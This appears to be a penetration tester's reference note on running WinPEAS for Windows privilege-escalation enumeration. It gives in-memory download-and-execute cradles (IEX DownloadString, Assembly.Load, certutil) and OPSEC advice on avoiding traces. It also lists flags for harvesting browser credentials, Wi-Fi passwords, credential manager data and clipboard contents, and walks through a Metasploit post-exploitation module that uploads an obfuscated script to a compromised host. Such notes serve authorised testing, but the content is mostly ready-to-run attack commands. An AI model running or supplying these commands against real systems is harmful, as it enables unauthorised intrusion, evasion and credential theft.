# [[03 - Offensive Infrastructure/E - Setup Machine/0x03 - Bring Your Own Land/Windows/Privilege Escalation/WinPEAS|WinPEAS]]

## 01 - Download Cradle

### 1.1 - .NET

```powershell
$url = 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe'

$wp = [System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```

### 1.2 - PowerShell

```
C:\> powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"

PS C:\> IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1")
```

### 1.3 - Command Prompt

```
C:\> certutil.exe -urlcache -split -f https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat winPEAS.bat

C:\> curl.exe -o winPEAS.bat https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
```

## 01 - Usage

> [!INFO] Enable Colors
> Add colors to the windows consoles to both command prompt (`cmd.exe`) and PowerShell.
> ```
> C:\> reg.exe add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
> 
> PS C:\> Set-ItemProperty -Path Regsitry::HKEY_CURRENT_USER\Console -Type DWord -Value 1
>  ```
> > [!CAUTION] OPSEC Consideration
> > Modifying this particular registry will leave a trace. Consider disabling colors with a subcommand `notcolor`.

It will display all of the results once executed.

```
C:\> .\winPEASx64.exe

C:\> .\winPEASx64.bat

PS C:\> .\winPEASx64.ps1
```

> [!CAUTION] OPSEC Consideration
> This will cause noise by absorbing resources.

Enumerate the system quickly.

```
C:\> .\winPEASx64.exe quiet searchfast
```

Search everything on the system.

```
C:\> .\winPEASx64.exe searchall

PS C:\> .\winPEASx64.ps1 [-FullCheck]
```

Enumerate web browser databases credentials.

```
C:\> .\winPEASx64.exe quiet browserinfo
```

Obtaining Wi-Fi passwords, credential manager and clipboard information using the command prompt commands.

```
C:\> .\winPEASx64.exe quiet cmd
```

Display the results that is related only to the user information.

```
C:\> .\winPEASx64.exe quiet userinfo
```

Enumerate installed programs that we might look into.

```
C:\> .\winPEASx64.exe quiet applicationsinfo
```

Enumerate to discover any insecure services that we can hijack.

```
C:\> .\winPEASx64.exe quiet servicesinfo
```

Provide information related to the current running processes.

```
C:\> .\winPEASx64.exe quiet processinfo
```

Discover networking information.

```
C:\> .\winPEASx64.exe quiet networkinfo
```

Enumerating the whole system and find kernel vulnerabilities.

```
C:\> .\winPEASx64.exe quiet systeminfo
```

## 02 - Metasploit

```
msf > use post/multi/gather/peass

msf post(multi/gather/peass) > options

Module options (post/multi/gather/peass):

   Name        Current Setting                              Required  Description
   ----        ---------------                              --------  -----------
   PARAMETERS                                               no        Parameters to pass to the script
   PASSWORD    w2ogatdfgsh1mcathikl7j39alk715q7             no        Password to encrypt and obfuscate the script (randomly generated). The length
                                                                      must be 32B. If no password is set, only base64 will be used.
   PEASS_URL   https://github.com/carlospolop/PEASS-ng/rel  yes       Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Lin
               eases/latest/download/winPEASany_ofs.exe               peas: https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
                                                                      .sh
   SESSION                                                  yes       The session to run this module on
   SRVHOST                                                  no        Set your metasploit instance IP if you want to download the PEASS script from
                                                                      here via http(s) instead of uploading it.
   SRVPORT     443                                          no        Port to download the PEASS script from using http(s) (only used if SRVHOST)
   SSL         true                                         no        Indicate if you want to communicate with https (only used if SRVHOST)
   SSLCert                                                  no        Path to a custom SSL certificate (default is randomly generated)
   TEMP_DIR                                                 no        Path to upload the obfuscated PEASS script inside the compromised machine. By
                                                                      default "C:\Windows\System32\spool\drivers\color" is used in Windows and "/tmp
                                                                      " in Unix.
   TIMEOUT     900                                          no        Timeout of the execution of the PEASS script (15min by default)
   URIPATH     /u6xm.txt                                    no        URI path to download the script from there (only used if SRVHOST)

msf post(multi/gather/peass) > advanced

Module advanced options (post/multi/gather/peass):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   ListenerBindAddress                   no        The specific IP address to bind to if different from SRVHOST
   ListenerBindPort                      no        The port to bind to if different from SRVPORT
   ListenerComm                          no        The specific communication channel to use for this service
   SSLCipher                             no        String for SSL cipher spec - "DHE-RSA-AES256-SHA" or "ADH"
   SSLCompression       false            no        Enable SSL/TLS-level compression
   SSLVersion           Auto             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Aut
                                                   o, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
   SendRobots           false            no        Return a robots.txt file if asked for one
   URIHOST                               no        Host to use in URI (useful for tunnels)
   URIPORT                               no        Port to use in URI (useful for tunnels)
   VERBOSE              false            no        Enable detailed status messages
   WORKSPACE                             no        Specify the workspace for this module

msf post(multi/gather/peass) > set peass_url http[s]://<IP>:<PORT>/winPEASx64.exe

msf post(multi/gather/peass) > set session <session_ID>

msf post(multi/gather/peass) > run

[+] PEASS script successfully retrieved.
[*] Encrypting PEASS and encoding it in Base64...
[*] Uploading obfuscated peass to C:\Windows\System32\spool\drivers\color\1ecke...
[+] Uploaded
[*] Running PEASS...
..[omitted]..

[+] PEASS output saved to: /root/.msf4/loot/20220515165546_default_10.0.2.15_PEASS_757580.txt
[*] Post module execution completed
```